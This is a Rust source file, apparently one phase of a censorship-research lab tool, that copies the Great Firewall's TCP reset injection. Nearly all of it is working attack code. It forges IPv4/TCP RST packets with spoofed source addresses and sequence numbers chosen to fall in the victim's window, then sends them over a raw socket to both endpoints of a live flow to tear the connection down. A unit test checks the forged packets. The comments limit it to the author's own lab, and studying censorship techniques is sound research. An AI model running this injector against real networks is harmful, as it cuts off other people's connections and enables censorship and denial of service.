// Phase 3: TCP RST injection - replicates the GFW's connection-reset technique.
// Own lab only: send spoofed RSTs to both endpoints of a matched flow so each side
// thinks the *other* tore down the connection, same as the documented GFW behavior
// (Clayton et al. 2006). Needs root (raw IP socket).
use pnet::packet::ipv4::{checksum as ipv4_checksum, Ipv4Flags, MutableIpv4Packet};
use pnet::packet::tcp::{ipv4_checksum as tcp_checksum, MutableTcpPacket, TcpFlags};
use pnet::transport::{transport_channel, TransportChannelType};
pub use pnet::transport::TransportSender;
use pnet::packet::ip::IpNextHeaderProtocols;
use std::net::{IpAddr, Ipv4Addr};

const IP_HDR_LEN: usize = 20;
const TCP_HDR_LEN: usize = 20;

/// Build a spoofed IPv4/TCP RST packet: appears to come from `src`, sent to `dst`,
/// with `seq` set so it falls inside the victim's receive window.
fn build_rst(src: Ipv4Addr, src_port: u16, dst: Ipv4Addr, dst_port: u16, seq: u32) -> Vec<u8> {
    let mut buf = vec![0u8; IP_HDR_LEN + TCP_HDR_LEN];

    {
        let mut tcp = MutableTcpPacket::new(&mut buf[IP_HDR_LEN..]).unwrap();
        tcp.set_source(src_port);
        tcp.set_destination(dst_port);
        tcp.set_sequence(seq);
        tcp.set_acknowledgement(0);
        tcp.set_data_offset(5); // 20-byte header, no options
        tcp.set_flags(TcpFlags::RST);
        tcp.set_window(0);
        let cksum = tcp_checksum(&tcp.to_immutable(), &src, &dst);
        tcp.set_checksum(cksum);
    }

    {
        let mut ip = MutableIpv4Packet::new(&mut buf).unwrap();
        ip.set_version(4);
        ip.set_header_length(5);
        ip.set_total_length((IP_HDR_LEN + TCP_HDR_LEN) as u16);
        ip.set_ttl(64);
        ip.set_flags(Ipv4Flags::DontFragment);
        ip.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
        ip.set_source(src);
        ip.set_destination(dst);
        let cksum = ipv4_checksum(&ip.to_immutable());
        ip.set_checksum(cksum);
    }

    buf
}

pub fn open_raw_sender() -> std::io::Result<TransportSender> {
    let (tx, _rx) = transport_channel(4096, TransportChannelType::Layer3(IpNextHeaderProtocols::Tcp))?;
    Ok(tx)
}

/// Reset both sides of a flow. `seq_to_b` = next seq the sender (A) hasn't used yet
/// (so B accepts a RST claiming to be from A); `seq_to_a` = the ack field A sent
/// (the seq B already told A about, so A accepts a RST claiming to be from B).
pub fn reset_flow(
    tx: &mut TransportSender,
    a: Ipv4Addr,
    a_port: u16,
    b: Ipv4Addr,
    b_port: u16,
    seq_to_b: u32,
    seq_to_a: u32,
) -> std::io::Result<()> {
    let to_b = build_rst(a, a_port, b, b_port, seq_to_b);
    let to_a = build_rst(b, b_port, a, a_port, seq_to_a);
    tx.send_to(pnet::packet::ipv4::Ipv4Packet::new(&to_b).unwrap(), IpAddr::V4(b))?;
    tx.send_to(pnet::packet::ipv4::Ipv4Packet::new(&to_a).unwrap(), IpAddr::V4(a))?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use pnet::packet::ipv4::Ipv4Packet;
    use pnet::packet::tcp::TcpPacket;
    use pnet::packet::Packet;

    #[test]
    fn rst_packet_is_well_formed() {
        let src = Ipv4Addr::new(10, 0, 0, 1);
        let dst = Ipv4Addr::new(10, 0, 0, 2);
        let raw = build_rst(src, 1234, dst, 443, 999);

        let ip = Ipv4Packet::new(&raw).unwrap();
        assert_eq!(ip.get_source(), src);
        assert_eq!(ip.get_destination(), dst);
        assert_eq!(ip.get_next_level_protocol(), IpNextHeaderProtocols::Tcp);
        // verify the stored checksum matches a fresh recomputation (zero the field first)
        let mut recompute = ip.packet().to_vec();
        recompute[10] = 0;
        recompute[11] = 0;
        let fresh = Ipv4Packet::new(&recompute).unwrap();
        assert_eq!(ipv4_checksum(&fresh), ip.get_checksum());

        let tcp = TcpPacket::new(ip.payload()).unwrap();
        assert_eq!(tcp.get_source(), 1234);
        assert_eq!(tcp.get_destination(), 443);
        assert_eq!(tcp.get_sequence(), 999);
        assert_eq!(tcp.get_flags(), TcpFlags::RST);
        let cksum = tcp_checksum(&tcp, &src, &dst);
        assert_eq!(cksum, tcp.get_checksum());
    }
}
